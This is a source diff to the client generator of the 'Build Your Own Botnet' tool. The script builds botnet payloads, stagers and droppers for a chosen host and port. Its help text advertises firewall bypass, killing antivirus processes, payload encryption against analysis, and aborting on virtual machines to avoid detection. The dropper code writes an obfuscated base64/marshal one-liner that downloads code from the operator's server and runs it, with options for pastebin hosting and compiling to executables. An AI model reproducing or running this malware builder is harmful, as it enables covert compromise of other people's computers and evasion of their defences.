@@ -20,7 +20,6 @@ optional arguments:
   --icon ICON     icon image file name
   --pastebin API  upload & host payload on pastebin
   --encrypt       encrypt payload and embed key in stager
-  --obfuscate     obfuscate names of classes, functions & variables
   --compress      zip-compress into a self-executing python script
   --freeze        compile client into a standalone executable for the current host platform
 
@@ -34,29 +33,29 @@ Generate clients with the following features:
         the server without downloading/installing them
 
     - In-Memory Execution Guidline
-        clients never write anything to the disk, 
+        clients never write anything to the disk,
         not even temporary files - zero IO system calls.
         remote imports allow code/scripts/modules to
-        be dynamically loaded into memory and directly 
+        be dynamically loaded into memory and directly
         imported into the currently running process
 
     - Add Your Own Scripts
         every python script, module, and package in the
-        `remote` directory is directl usable by every 
+        `remote` directory is directl usable by every
         client at all times while the server is running
 
     - Unlimited Modules Without Bloating File Size
         use remote imports to add unlimited features without
-        adding a single byte to the client's file size 
+        adding a single byte to the client's file size
 
     - Updatable
         client periodically checks the content available
-        for remote import from the server, and will 
+        for remote import from the server, and will
         dynamically update its in-memory resources
         if anything has been added/removed
 
     - Platform Independent
-        compatible with PyInstaller and package is authored 
+        compatible with PyInstaller and package is authored
         in Python, a platform agnostic language
 
     - Bypass Firewall
@@ -69,8 +68,8 @@ Generate clients with the following features:
         with names of known antivirus products
 
     - Prevent Analysis
-        main client payload encrypted with a random 
-        256-bit key and is only 
+        main client payload encrypted with a random
+        256-bit key and is only
 
     - Avoid Detection
         client will abort execution if a virtual machine
@@ -80,21 +79,15 @@ Generate clients with the following features:
 # standard library
 import os
 import sys
-import imp
-import json
 import zlib
-import struct
 import base64
 import random
 import urllib
 import urllib2
 import marshal
-import logging
-import requests
 import argparse
 import itertools
 import threading
-import subprocess
 
 # packages
 import colorama
@@ -106,7 +99,7 @@ import core.generators as generators
 
 # globals
 colorama.init(autoreset=True)
-__banner = """ 
+__banner = """
 
 88                                  88
 88                                  88
@@ -122,15 +115,16 @@ __banner = """
 
 # main
 def main():
-    """ 
+    """
     Run the generator
 
     """
     util.display(globals()['__banner'], color=random.choice(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))), style='normal')
 
-    parser = argparse.ArgumentParser(prog='client.py', 
-                                    version='0.1.5',
-                                    description="Generator (Build Your Own Botnet)")
+    parser = argparse.ArgumentParser(
+        prog='client.py',
+        description="Generator (Build Your Own Botnet)"
+    )
 
     parser.add_argument('host',
                         action='store',
@@ -143,7 +137,7 @@ def main():
                         help='server port number')
 
     parser.add_argument('modules',
-                        metavar='module',   
+                        metavar='module',
                         action='append',
                         nargs='*',
                         help='module(s) to remotely import at run-time')
@@ -165,10 +159,6 @@ def main():
                         action='store_true',
                         help='encrypt the payload with a random 128-bit key embedded in the payload\'s stager',
                         default=False)
-#    parser.add_argument('--obfuscate',
-#                        action='store_true',
-#                        help='obfuscate names of classes, functions, variables, import-methods, and builtin-keywords',
-#                        default=False)
 
     parser.add_argument('--compress',
                         action='store_true',
@@ -179,6 +169,12 @@ def main():
                         action='store_true',
                         help='compile client into a standalone executable for the current host platform',
                         default=False)
+
+    parser.add_argument(
+        '-v', '--version',
+        action='version',
+        version='0.2',
+    )
 
     options = parser.parse_args()
     key = base64.b64encode(os.urandom(16))
@@ -199,11 +195,12 @@ def _modules(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display('Modules', color='reset', style='bright')
     util.display("\tAdding modules... ", color='reset', style='normal', end=',')
- 
+
+    global __load__
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
- 
-    modules = ['core/loader.py','core/util.py','core/security.py','core/payloads.py']
+
+    modules = ['core/util.py','core/security.py','core/payloads.py']
 
     if len(options.modules):
         for m in options.modules:
@@ -224,14 +221,15 @@ def _modules(options, **kwargs):
 def _imports(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Imports", color='reset', style='bright')
- 
+
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
- 
+
     util.display("\tAdding imports...", color='reset', style='normal', end=',')
- 
+
+    global __load__
     globals()['__load__'] = threading.Event()
     globals()['__spin__'] = _spinner(__load__)
- 
+
     imports  = set()
 
     for module in kwargs['modules']:
@@ -243,24 +241,18 @@ def _imports(options, **kwargs):
                             break
                     else:
                         imports.add(line.strip())
-                elif len(line.split()) > 3:
-                    if line.split()[0] == 'from' and line.split()[1] != '__future__' and line.split()[2] == 'import':
-                        for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
-                            if x in line.strip():
-                                break
-                        else:
-                            imports.add(line.strip())
+
     imports = list(imports)
     if sys.platform != 'win32':
         for item in imports:
             if 'win32' in item or '_winreg' in item:
                 imports.remove(item)
     return imports
-                 
+
 def _hidden(options, **kwargs):
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
- 
+
     hidden = set()
 
     for line in kwargs['imports']:
@@ -285,21 +277,15 @@ def _payload(options, **kwargs):
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
 
-    payload = '\n'.join(list(kwargs['imports']) + [open(module,'r').read().partition('# main')[2] for module in kwargs['modules']]) + generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
+    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
+    modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
+    payload = '\n'.join((loader, modules))
+
     if not os.path.isdir('modules/payloads'):
         try:
             os.mkdir('modules/payloads')
         except OSError:
             util.log("Permission denied: unabled to make directory './modules/payloads/'")
-
- #   if options.obfuscate:
- #       __load__= threading.Event()
- #       util.display("\tObfuscating payload... ", color='reset', style='normal', end=',')
- #       __spin__= _spinner(__load__)
- #       output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
- #       __load__.set()
- #       _update(payload, output, task='Obfuscation')
- #       payload = output
 
     if options.compress:
         util.display("\tCompressing payload... ", color='reset', style='normal', end=',')
@@ -315,7 +301,7 @@ def _payload(options, **kwargs):
         util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
-        output = security.encrypt_xor(payload, kwargs['key'])
+        output = security.encrypt_xor(payload, base64.b64decode(kwargs['key']))
         __load__.set()
         _update(payload, output, task='Encryption')
         payload = output
@@ -337,7 +323,7 @@ def _payload(options, **kwargs):
 
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
 
-        with file(path, 'w') as fp:
+        with open(path, 'w') as fp:
             fp.write(payload)
 
         s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
@@ -356,7 +342,7 @@ def _stager(options, **kwargs):
     assert 'key' in kwargs, "missing keyword argument 'key'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
 
-    if options.encrypt: 
+    if options.encrypt:
         stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
     else:
         stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'])
@@ -367,20 +353,11 @@ def _stager(options, **kwargs):
         except OSError:
             util.log("Permission denied: unable to make directory './modules/stagers/'")
 
-#    if options.obfuscate:
-#        util.display("\tObfuscating stager... ", color='reset', style='normal', end=',')
-#        __load__ = threading.Event()
-#        __spin__ = _spinner(__load__)
-#        output = generators.obfuscate(stager)
-#        __load__.set()
-#        _update(stager, output, task='Obfuscation')
-#        stager = output
-
     if options.compress:
         util.display("\tCompressing stager... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
-        output  = base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))
+        output = generators.compress(stager)
         __load__.set()
         _update(stager, output, task='Compression')
         stager = output
@@ -391,7 +368,7 @@ def _stager(options, **kwargs):
 
     if options.pastebin:
         assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
-        url = util.pastebin(stager, api_dev_key=options.pastebin)
+        url = util.pastebin(stager, options.pastebin)
     else:
         dirs = ['modules/stagers','byob/modules/stagers','byob/byob/modules/stagers']
         dirname = '.'
@@ -401,7 +378,7 @@ def _stager(options, **kwargs):
 
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
 
-        with file(path, 'w') as fp:
+        with open(path, 'w') as fp:
             fp.write(stager)
 
         s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
@@ -416,7 +393,7 @@ def _dropper(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Dropper", color='reset', style='bright')
     util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
-    
+
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'hidden' in kwargs, "missing keyword argument 'hidden'"
@@ -424,29 +401,29 @@ def _dropper(options, **kwargs):
     name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
-    dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
-    with file(name, 'w') as fp:
+    dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
+    with open(name, 'w') as fp:
         fp.write(dropper)
+    util.display('({:,} bytes written to {})'.format(len(dropper), name), style='dim', color='reset')
 
     if options.freeze:
-        util.display('\tCompiling executable... ', color='reset', style='normal', end=',')
-        __load__ = threading.Event()
-        __spin__ = _spinner(__load__)
+        util.display('\tCompiling executable...\n', color='reset', style='normal', end=',')
         name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
-        __load__.set()
-        
-    util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
+        util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
 
 @util.threaded
 def _spinner(flag):
     spinner = itertools.cycle(['-', '/', '|', '\\'])
     while not flag.is_set():
-        sys.stdout.write(next(spinner))
-        sys.stdout.flush()
-        flag.wait(0.2)
-        sys.stdout.write('\b')
-        sys.stdout.flush()
+        try:
+            sys.stdout.write(next(spinner))
+            sys.stdout.flush()
+            flag.wait(0.2)
+            sys.stdout.write('\b')
+            sys.stdout.flush()
+        except:
+            break
 
 if __name__ == '__main__':
     main()
